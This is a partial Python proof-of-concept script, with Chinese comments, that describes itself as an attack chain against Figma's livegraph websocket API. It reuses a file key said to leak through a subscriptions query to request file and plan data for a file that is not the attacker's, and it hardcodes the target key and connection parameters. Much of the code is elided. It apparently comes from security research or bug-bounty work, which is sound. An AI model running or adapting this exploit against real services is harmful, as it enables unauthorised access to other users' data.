"""攻击链闭环：LibraryFileSubscriptions 泄露的 fileKey → FileByKey → PlanByFileKey"""
import sys, json, asyncio
import websockets
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"
SUB_FILE = "cQBfbmMrjx4WNnpCt79xwM"  # LibraryFileSubscriptions 泄露的订阅库文件
...
def lg_url():
    return (f"wss://www.figma.com/api/livegraph?pv=1&pr=251c5be83e6853e5&pt=1786072093"
            ...
            f"&clientUrl=https%3A%2F%2Fwww.figma.com%2Ffile%2F{SUB_FILE}"
        ...
        async with websockets.connect(lg_url(),
            ...
            await ws.send(json.dumps({"messageType": "auth", "clientType": "web",
                                      ...
                                      "tags": {"clientType": "web",
                                               ...
                                               "clientUrl": f"https://www.figma.com/file/{SUB_FILE}"},
...
async def main():
    await sub("FileByKey→订阅库文件", "FileByKey", {"fileKey": SUB_FILE})
    await sub("PlanByFileKey→订阅库文件", "PlanByFileKey", {"fileKey": SUB_FILE})
